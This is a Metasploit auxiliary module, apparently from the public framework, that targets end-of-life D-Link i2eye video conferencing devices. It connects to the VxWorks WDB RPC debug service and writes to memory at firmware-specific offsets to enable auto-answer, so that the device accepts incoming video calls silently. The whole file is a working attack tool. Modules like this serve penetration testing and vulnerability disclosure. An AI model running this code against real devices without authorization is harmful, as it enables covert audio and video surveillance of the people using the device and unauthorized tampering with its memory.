##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::WDBRPC_Client

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'D-Link i2eye Video Conference AutoAnswer (WDBRPC)',
      'Description'    => %q{
        This module can be used to enable auto-answer mode for the D-Link
      i2eye video conferencing system. Once this setting has been flipped,
      the device will accept incoming video calls without acknowledgement.
      The NetMeeting software included in Windows XP can be used to connect
      to this device. The i2eye product is no longer supported by the vendor
      and all models have reached their end of life (EOL).
      },
      'Author'         => [ 'hdm'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '66842'],
          ['URL', 'http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html'],
          ['US-CERT-VU', '362332']
        ]
      ))
  end

  def run
    target  = nil
    targets = {
      # Original firmware for the North America DVC1000
      "Sorenson VP100 - ARM9TDMI"   => [[0x00229a05, 0x00000000, 0x00000001]],

      # Final firmware for the North America DVC1000
      # Also covers a mislabeled "Sorenson VP100" (revision A3)
      "i-2-eye DVC1000 - ARM9TDMI"  => [
        [0x0040cd68, 0x00000000, 0x01000000],
        [0x0040af38, 0x00000000, 0x01000000],
        [0x0040cd00, 0x00000000, 0x01000000]
      ],
    }


    wdbrpc_client_connect

    if not @wdbrpc_info[:rt_vers]
      print_error("No response to connection request")
      return
    end

    membase = @wdbrpc_info[:rt_membase]

    target = targets[@wdbrpc_info[:rt_bsp_name]]
    if not target
      print_error("No target available for BSP #{@wdbrpc_info[:rt_bsp_name]}")
      wdbrpc_client_disconnect
      return
    end

    target.each do |r|
      offset, oldval, newval = r

      curr = wdbrpc_client_memread(membase + offset, 4).unpack("N")[0]
      if curr != oldval and curr != newval
        print_error("The value at offset #{"0x%.8x" % offset} does not match this target (#{"0x%.8x" % curr}), skipping...")
        next
      end

      if curr == newval
        print_good("The value at offset #{"0x%.8x" % offset} has already been set")
      else
        wdbrpc_client_memwrite(membase + offset, [newval].pack("N"))
        curr = wdbrpc_client_memread(membase + offset, 4).unpack("N")[0]
        print_good("The value at offset #{"0x%.8x" % offset} has been set to #{"0x%.8x" % curr}")
      end

      print_status("The target device should now automatically accept incoming calls")
    end

    wdbrpc_client_disconnect
  end

end
